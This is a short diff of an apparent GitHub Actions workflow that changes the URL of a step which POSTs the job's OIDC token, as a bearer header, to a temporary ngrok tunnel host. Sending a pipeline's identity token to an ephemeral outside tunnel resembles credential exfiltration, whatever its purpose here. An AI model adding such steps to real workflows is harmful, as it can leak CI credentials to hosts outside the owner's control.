@@ -27,4 +27,4 @@ jobs:
         run: |
           curl -X POST \
             -H "Authorization: Bearer $OIDC_TOKEN" \
-            https://5d68-86-149-79-251.ngrok-free.app/github/auth
+            https://f28f-86-149-79-251.ngrok-free.app/github/auth
